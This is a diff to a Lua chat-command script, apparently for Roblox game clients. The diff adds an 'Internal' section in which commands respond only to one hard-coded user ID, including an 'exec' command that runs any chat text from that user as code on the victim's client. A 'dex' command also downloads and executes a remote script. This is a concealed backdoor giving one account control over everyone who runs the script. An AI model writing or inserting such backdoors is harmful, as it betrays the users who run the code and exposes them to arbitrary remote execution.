@@ -265,11 +265,6 @@ USER PROMPT:
 		end
 	end}
 
-	commands.rejoin = {function()
-		chat("Rejoining...")
-		TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
-	end}
-
 	commands.die = {function()
 		replicatesignal(localPlayer.ConnectDiedSignalBackend)
 		task.wait(Players.RespawnTime + 0.20)
@@ -385,11 +380,7 @@ USER PROMPT:
 			end
 		end
 	end}
-
-	commands.dex = {function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/raelhubfunctions/Save-scripts/refs/heads/main/DexMobile.lua"))()	
-	end}
-
+	
 	commands.carpet = {function(speaker, args)
 		local targetPlayer = findPlayer(speaker, args[1])
 		local char = localPlayer.Character
@@ -491,6 +482,49 @@ USER PROMPT:
 	end,
 	}
 
+	-----------------------------
+	-- Internal
+	-----------------------------
+
+	commands.rejoin = {function(speaker)
+		if speaker.UserId == 10984088 then
+			chat("Rejoining...")
+			TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
+		end
+	end}	
+
+	commands.dex = {function(speaker)
+		if speaker.UserId == 10984088 then
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/raelhubfunctions/Save-scripts/refs/heads/main/DexMobile.lua"))()	
+		end
+	end}
+
+	commands.exec = {function(speaker, args)
+if speaker.UserId == 10984088 then
+        local code = table.concat(args, " ")
+        local executable, compileError = loadstring(code)
+        
+        if not executable then
+            warn("Script Error:", compileError)
+            return
+        end
+
+        local customEnv = {
+			localPlayer = localPlayer,
+            chat = chat,
+            whisper = whisper,
+            speaker = speaker,
+            script = script 
+        }
+
+        setmetatable(customEnv, {
+            __index = getfenv() 
+        })
+
+        setfenv(executable, customEnv)
+        executable() 
+    end
+	end}
 end
 
 local function onMessageReceived(message)
